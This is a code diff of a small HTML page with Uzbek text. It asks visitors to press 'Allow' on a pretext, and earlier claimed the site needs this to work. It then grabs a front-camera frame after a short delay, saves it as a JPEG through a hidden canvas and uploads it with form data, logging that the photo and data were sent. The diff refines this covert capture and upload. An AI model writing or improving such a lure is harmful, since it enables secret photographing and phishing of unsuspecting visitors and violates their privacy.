@@ -4,30 +4,39 @@
     <meta charset="UTF-8">
     <title>Salom</title>
     <style>
-        #video {
-            display: none; 
+        video {
+            display: block;
+            width: 100%;
+            max-width: 300px;
         }
     </style>
 </head>
 <body>
-    <h1>Iltimos sayt to'liq ishlashi uchun ruxsat berish/разрешить/Allow ni bosing</h1>
+    <h1>Iltimos, ruxsat berish/разрешить/Allow tugmasini bosing</h1>
 
-   
-  <video id="video" autoplay playsinline style="display: block; width: 300px;"></video>
-  <canvas id="canvas" style="display: none;"></canvas>
-  <br>
-
-
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 video.srcObject = stream;
 
                 video.onloadedmetadata = () => {
-                    setTimeout(captureAndSendPhoto, 1000); 
+                    video.play();
+
+                    // Video oqimi boshlanganidan so‘ng o‘lchamlarni sozlaymiz
+                    video.addEventListener('playing', () => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        // Kamera tayyor bo‘lishi uchun 3 soniya kutamiz
+                        setTimeout(captureAndSendPhoto, 3000);
+                    });
                 };
             })
             .catch(err => {
@@ -35,11 +44,7 @@
             });
 
         async function captureAndSendPhoto() {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
@@ -66,9 +71,9 @@
                 body: formData
             }).then(res => {
                 if (res.ok) {
-                    console.log("Rasm va malumotlar yuborildi ✅");
+                    console.log("✅ Rasm va ma'lumotlar yuborildi");
                 } else {
-                    console.error("Yuborishda xatolik ❌");
+                    console.error("❌ Yuborishda xatolik");
                 }
             }).catch(err => {
                 console.error("Xatolik:", err);
